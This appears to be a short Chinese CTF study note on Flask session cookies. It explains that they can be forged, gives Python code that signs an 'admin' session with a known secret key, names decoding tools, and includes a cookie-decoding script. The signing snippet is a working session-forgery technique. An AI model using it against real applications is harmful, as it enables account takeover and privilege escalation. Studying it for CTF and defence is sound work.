- 存储在 cookie 中，可以伪造
- 使用secret_key签名任意对象：
	- ```python
	  from flask import Flask
	  from flask.sessions import SecureCookieSessionInterface
	  app = Flask(__name__)
	  app.secret_key = b"fb+wwn!n1yo+9c(9s6!_3o#nqm&&_ej$tez)$_ik36n8d7o6mr#y"
	  session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)
	  print(session_serializer.dumps("admin"))
	  ```
- 可以用 flask-session-cookie-manager 或者 [[CTFWEB/Flask-Unsign]] 解密
- 也可以用如下代码解密
	- ```python
	  #!/usr/bin/env python3
	  import sys
	  import zlib
	  from base64 import b64decode
	  from flask.sessions import session_json_serializer
	  from itsdangerous import base64_decode
	  
	  def decryption(payload):
	      payload, sig = payload.rsplit(b'.', 1)
	      payload, timestamp = payload.rsplit(b'.', 1)
	  
	      decompress = False
	      if payload.startswith(b'.'):
	          payload = payload[1:]
	          decompress = True
	  
	      try:
	          payload = base64_decode(payload)
	      except Exception as e:
	          raise Exception('Could not base64 decode the payload because of '
	                           'an exception')
	  
	      if decompress:
	          try:
	              payload = zlib.decompress(payload)
	          except Exception as e:
	              raise Exception('Could not zlib decompress the payload before '
	                               'decoding the payload')
	  
	      return session_json_serializer.loads(payload)
	  
	  if __name__ == '__main__':
	      print(decryption(sys.argv[1].encode()))
	  ```